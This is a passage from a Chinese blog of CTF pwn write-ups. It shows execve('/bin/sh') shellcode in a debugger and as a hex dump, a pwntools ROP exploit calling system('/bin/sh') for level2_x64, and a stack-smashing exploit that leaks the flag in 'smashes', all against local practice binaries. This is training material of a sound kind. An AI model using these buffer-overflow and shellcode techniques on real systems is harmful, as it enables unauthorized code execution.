+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">  <span class="hljs-number">0xfff0a98c</span>    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">esp</span><br>  <span class="hljs-number">0xfff0a98e</span>    <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1010101</span><br>  <span class="hljs-number">0xfff0a993</span>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0x1016972</span><br>  <span class="hljs-number">0xfff0a99a</span>    <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br>  <span class="hljs-number">0xfff0a99c</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">al</span><br>   ↓<br>► <span class="hljs-number">0xfff0a99d</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">al</span><br>  <span class="hljs-number">0xfff0a99f</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebx</span> + <span class="hljs-number">0x68</span>], <span class="hljs-number">dh</span><br>  <span class="hljs-number">0xfff0a9a2</span>    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">al</span><br>  <span class="hljs-number">0xfff0a9a4</span>    <span class="hljs-keyword">das</span>    <br>  <span class="hljs-number">0xfff0a9a5</span>    <span class="hljs-keyword">bound</span>  <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-number">0x6e</span>]<br>  <span class="hljs-number">0xfff0a9a8</span>    <span class="hljs-keyword">das</span>    <br><br><br><br>  <span class="hljs-number">0x80484b6</span>  &lt;vulnerable_function+<span class="hljs-number">59</span>&gt;    <span class="hljs-keyword">ret</span>    <br>   ↓<br>► <span class="hljs-number">0xff8f0900</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x68</span><br>  <span class="hljs-number">0xff8f0902</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x732f2f2f</span><br>  <span class="hljs-number">0xff8f0907</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x6e69622f</span><br>  <span class="hljs-number">0xff8f090c</span>                             <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">esp</span><br>  <span class="hljs-number">0xff8f090e</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">0x1010101</span><br>  <span class="hljs-number">0xff8f0913</span>                             <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esp</span>], <span class="hljs-number">0x1016972</span><br>  <span class="hljs-number">0xff8f091a</span>                             <span class="hljs-keyword">xor</span>    <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ecx</span><br>  <span class="hljs-number">0xff8f091c</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-built_in">ecx</span><br>  <span class="hljs-number">0xff8f091d</span>                             <span class="hljs-keyword">push</span>   <span class="hljs-number">4</span><br>  <span class="hljs-number">0xff8f091f</span>                             <span class="hljs-keyword">pop</span>    <span class="hljs-built_in">ecx</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00000060</span>  <span class="hljs-number">6</span>a <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">2</span>f  <span class="hljs-number">2</span>f <span class="hljs-number">2</span>f <span class="hljs-number">73</span> <span class="hljs-number">68</span>  <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e  <span class="hljs-number">89</span> e<span class="hljs-number">3</span> <span class="hljs-number">68</span> <span class="hljs-number">01</span>  │jhh/│//sh│/bin│··h·│<br><span class="hljs-attribute">00000070</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">81</span>  <span class="hljs-number">34</span> <span class="hljs-number">24</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">31</span> c<span class="hljs-number">9</span>  <span class="hljs-number">51</span> <span class="hljs-number">6</span>a <span class="hljs-number">04</span> <span class="hljs-number">59</span>  │····│<span class="hljs-number">4</span>$ri│··<span class="hljs-number">1</span>·│Qj·Y│<br><span class="hljs-attribute">00000080</span>  <span class="hljs-number">01</span> e<span class="hljs-number">1</span> <span class="hljs-number">51</span> <span class="hljs-number">89</span>  e<span class="hljs-number">1</span> <span class="hljs-number">31</span> d<span class="hljs-number">2</span> <span class="hljs-number">6</span>a  <span class="hljs-number">0</span>b <span class="hljs-number">58</span> cd <span class="hljs-number">80</span>  b<span class="hljs-number">0</span> <span class="hljs-number">47</span> c<span class="hljs-number">7</span> ff <br><br><br><span class="hljs-attribute">00000000</span>  <span class="hljs-number">6</span>a <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">2</span>f  <span class="hljs-number">2</span>f <span class="hljs-number">2</span>f <span class="hljs-number">73</span> <span class="hljs-number">68</span>  <span class="hljs-number">2</span>f <span class="hljs-number">62</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e  <span class="hljs-number">89</span> e<span class="hljs-number">3</span> <span class="hljs-number">68</span> <span class="hljs-number">01</span>  │jhh/│//sh│/bin│··h·│<br><span class="hljs-attribute">00000010</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">81</span>  <span class="hljs-number">34</span> <span class="hljs-number">24</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span>  <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">31</span> c<span class="hljs-number">9</span>  <span class="hljs-number">51</span> <span class="hljs-number">6</span>a <span class="hljs-number">04</span> <span class="hljs-number">59</span>  │····│<span class="hljs-number">4</span>$ri│··<span class="hljs-number">1</span>·│Qj·Y│<br><span class="hljs-attribute">00000020</span>  <span class="hljs-number">01</span> e<span class="hljs-number">1</span> <span class="hljs-number">51</span> <span class="hljs-number">89</span>  e<span class="hljs-number">1</span> <span class="hljs-number">31</span> d<span class="hljs-number">2</span> <span class="hljs-number">6</span>a  <span class="hljs-number">0</span>b <span class="hljs-number">58</span> cd <span class="hljs-number">80</span>  <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span> <span class="hljs-number">90</span>  │··Q·│·<span class="hljs-number">1</span>·j│·X··│····│<br></code></pre></td></tr></table></figure>
+<h2 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h2><p>level2 gdb 无法正常调试 。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b *0x400619		<span class="hljs-comment"># 无法加断点run</span></span><br>Starting program: /home/pwn/桌面/题目/练习题/pwn2_x64/level2_x64 <br>[Attaching after process 4686 vfork to child process 4690]<br>[New inferior 2 (process 4690)]<br>[Detaching vfork parent process 4686 after child exec]<br>[Inferior 1 (process 4686) detached]<br>process 4690 is executing new program: /usr/bin/dash<br>Warning:<br>Cannot insert breakpoint 1.<br>Cannot access memory at address 0x400619<br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> b main		<span class="hljs-comment"># 运行至 call   system@plt &lt;system@plt&gt; 出错</span></span><br>[Attaching after process 4764 vfork to child process 4769]<br>[New inferior 2 (process 4769)]<br>[Detaching vfork parent process 4764 after child exec]<br>[Inferior 1 (process 4764) detached]<br>process 4769 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: Function &quot;main&quot; not defined.<br>Input:<br>[Inferior 2 (process 4769) exited normally]<br></code></pre></td></tr></table></figure>
+<p>_system 地址不可行 。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./level2_x64&quot;</span>)<br>io.recvline()<br><br><span class="hljs-comment">#system_addr=0x00000000004004c0		# _system</span><br>system_addr=<span class="hljs-number">0x000000000040063E</span>		<span class="hljs-comment"># call    _system</span><br>poprdi_drt=<span class="hljs-number">0x00000000004006b3</span><br>binsh_addr=<span class="hljs-number">0x0000000000600A90</span><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">8</span>+p64(poprdi_drt)+p64(binsh_addr)+p64(system_addr)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> search CTF</span><br>smashes         0x400d21 push   r12 /* &quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot; */<br>smashes         0x600d21 &quot;CTF&#123;Here&#x27;s the flag on server&#125;&quot;<br>warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d02, halting search.<br>[stack]         0x7fffffffe3fe &#x27;CTF:@/tmp/.ICE-unix/1217,unix/CTF:/tmp/.ICE-unix/1217&#x27;<br>[stack]         0x7fffffffe41c &#x27;CTF:/tmp/.ICE-unix/1217&#x27;<br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> search samshes</span><br>warning: Unable to access 16000 bytes of target memory at 0x7ffff7bd4d06, halting search.<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> stack</span><br>00:0000│ rsp  0x7fffffffdf78 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax<br>01:0008│      0x7fffffffdf80 ◂— 0x1<br>02:0010│      0x7fffffffdf88 —▸ 0x7fffffffe058 —▸ 0x7fffffffe38d ◂— 0x77702f656d6f682f (&#x27;/home/pw&#x27;)<br>03:0018│      0x7fffffffdf90 ◂— 0x1f7ffcca0<br>04:0020│      0x7fffffffdf98 —▸ 0x4006d0 ◂— sub    rsp, 8<br>05:0028│      0x7fffffffdfa0 ◂— 0x0<br>06:0030│      0x7fffffffdfa8 ◂— 0x46bc826743e3b977<br>07:0038│      0x7fffffffdfb0 —▸ 0x4006ee ◂— xor    ebp, ebp<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> x/2s 0x7fffffffe38d</span><br>0x7fffffffe38d:	&quot;/home/pwn/桌面/题目/练习题/smashes/smashes&quot;<br>0x7fffffffe3bf:	&quot;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> stack 70</span><br>00:0000│ rax rsp  0x7fffffffde40 ◂— &#x27;AAAAAAAA&#x27;<br>01:0008│ rdi      0x7fffffffde48 ◂— 0x0<br>... ↓<br>04:0020│          0x7fffffffde60 —▸ 0x7ffff7ffea88 —▸ 0x7ffff7ffe9b8 —▸ 0x7ffff7ffe728 —▸ 0x7ffff7ffe700 ◂— ...<br>05:0028│          0x7fffffffde68 —▸ 0x7fffffffdea0 —▸ 0x7ffff7ffb2a8 ◂— add    byte ptr [rax], al /* &#x27;J&#x27; */<br>06:0030│          0x7fffffffde70 ◂— 0x340<br>07:0038│          0x7fffffffde78 —▸ 0x7fffffffde90 ◂— 0xffffffff<br>08:0040│          0x7fffffffde80 ◂— 0x6562b026<br>09:0048│          0x7fffffffde88 —▸ 0x7ffff7b99727 ◂— pop    rdi /* &#x27;__vdso_getcpu&#x27; */<br>0a:0050│          0x7fffffffde90 ◂— 0xffffffff<br>0b:0058│          0x7fffffffde98 —▸ 0x7ffff7ffe718 —▸ 0x7ffff7ff7000 —▸ 0x7ffff7a0d000 ◂— jg     0x7ffff7a0d047<br>0c:0060│          0x7fffffffdea0 —▸ 0x7ffff7ffb2a8 ◂— add    byte ptr [rax], al /* &#x27;J&#x27; */<br>0d:0068│          0x7fffffffdea8 —▸ 0x7ffff7ffe700 —▸ 0x7ffff7ffb000 ◂— jg     0x7ffff7ffb047<br>0e:0070│          0x7fffffffdeb0 —▸ 0x7fffffffde01 ◂— 0x7fffffffe0<br>0f:0078│          0x7fffffffdeb8 ◂— 0x2ca4b2531b62<br>10:0080│          0x7fffffffdec0 ◂— 0x2<br>11:0088│          0x7fffffffdec8 ◂— 0x8000000000000006<br>12:0090│          0x7fffffffded0 ◂— 0x0<br>... ↓<br>18:00c0│          0x7fffffffdf00 ◂— 0x1<br>19:00c8│          0x7fffffffdf08 —▸ 0x7fffffffe068 —▸ 0x7fffffffe3bf ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;<br>1a:00d0│          0x7fffffffdf10 —▸ 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2887<br>1b:00d8│          0x7fffffffdf18 —▸ 0x7ffff7a88957 (_IO_default_setbuf+23) ◂— cmp    eax, -1<br>1c:00e0│          0x7fffffffdf20 —▸ 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2887<br>1d:00e8│          0x7fffffffdf28 ◂— 0x0<br>... ↓<br>1f:00f8│          0x7fffffffdf38 —▸ 0x7ffff7a85449 (_IO_file_setbuf+9) ◂— test   rax, rax<br>20:0100│          0x7fffffffdf40 —▸ 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2887<br>21:0108│          0x7fffffffdf48 ◂— 0x1e01344de41fba00<br>22:0110│          0x7fffffffdf50 ◂— 0x0<br>... ↓<br>24:0120│          0x7fffffffdf60 —▸ 0x4008b0 ◂— push   r15<br>25:0128│          0x7fffffffdf68 —▸ 0x4006e7 ◂— xor    eax, eax<br>26:0130│          0x7fffffffdf70 ◂— 0x0<br>27:0138│          0x7fffffffdf78 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax<br>28:0140│          0x7fffffffdf80 ◂— 0x1<br>29:0148│          0x7fffffffdf88 —▸ 0x7fffffffe058 —▸ 0x7fffffffe38d ◂— 0x77702f656d6f682f (&#x27;/home/pw&#x27;)<br>2a:0150│          0x7fffffffdf90 ◂— 0x1f7ffcca0<br>2b:0158│          0x7fffffffdf98 —▸ 0x4006d0 ◂— sub    rsp, 8<br>2c:0160│          0x7fffffffdfa0 ◂— 0x0<br>2d:0168│          0x7fffffffdfa8 ◂— 0x46bc826743e3b977<br>2e:0170│          0x7fffffffdfb0 —▸ 0x4006ee ◂— xor    ebp, ebp<br>2f:0178│          0x7fffffffdfb8 —▸ 0x7fffffffe050 ◂— 0x1<br>30:0180│          0x7fffffffdfc0 ◂— 0x0<br>... ↓<br>32:0190│          0x7fffffffdfd0 ◂— 0xb9437d18ed83b977<br>33:0198│          0x7fffffffdfd8 ◂— 0xb9436da2fd73b977<br>34:01a0│          0x7fffffffdfe0 ◂— 0x0<br>... ↓<br>37:01b8│          0x7fffffffdff8 —▸ 0x7fffffffe068 —▸ 0x7fffffffe3bf ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;<br>38:01c0│          0x7fffffffe000 —▸ 0x7ffff7ffe168 ◂— 0x0<br>39:01c8│          0x7fffffffe008 —▸ 0x7ffff7de780b (_dl_init+139) ◂— jmp    0x7ffff7de77e0<br>3a:01d0│          0x7fffffffe010 ◂— 0x0<br>... ↓<br>3c:01e0│          0x7fffffffe020 —▸ 0x4006ee ◂— xor    ebp, ebp<br>3d:01e8│          0x7fffffffe028 —▸ 0x7fffffffe050 ◂— 0x1<br>3e:01f0│          0x7fffffffe030 ◂— 0x0<br>3f:01f8│          0x7fffffffe038 —▸ 0x400717 ◂— hlt    <br>40:0200│          0x7fffffffe040 —▸ 0x7fffffffe048 ◂— 0x1c<br>41:0208│          0x7fffffffe048 ◂— 0x1c<br>42:0210│ r13      0x7fffffffe050 ◂— 0x1<br>43:0218│          0x7fffffffe058 —▸ 0x7fffffffe38d ◂— 0x77702f656d6f682f (&#x27;/home/pw&#x27;)<br>44:0220│          0x7fffffffe060 ◂— 0x0<br>45:0228│          0x7fffffffe068 —▸ 0x7fffffffe3bf ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">pwndbg&gt;</span><span class="bash"> distance <span class="hljs-variable">$rsp</span> 0x7fffffffe058</span><br><span class="hljs-meta">0x7fffffffde40-&gt;</span><span class="bash">0x7fffffffe058 is 0x218 bytes (0x43 words)</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=process(<span class="hljs-string">&quot;./smashes&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>);<br><br>flag_addr=<span class="hljs-number">0x400d20</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span>+p64(flag_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h2><p><a target="_blank" rel="noopener" href="http://www.chiange.com/test/">[pwnable.kr] echo2 (Rewritten with .md) – Chiang E’s Blog</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Pwn/">Pwn</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Pwn/">Pwn</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/08/Code/Python/Python%E8%B7%A8%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8%E5%87%BD%E6%95%B0/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Python跨文件调用函数</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/06/MessUp/Typora%E5%BC%80%E5%8F%91%E7%89%88%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
+                        <span class="hidden-mobile">Typora开发版无法使用解决方法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
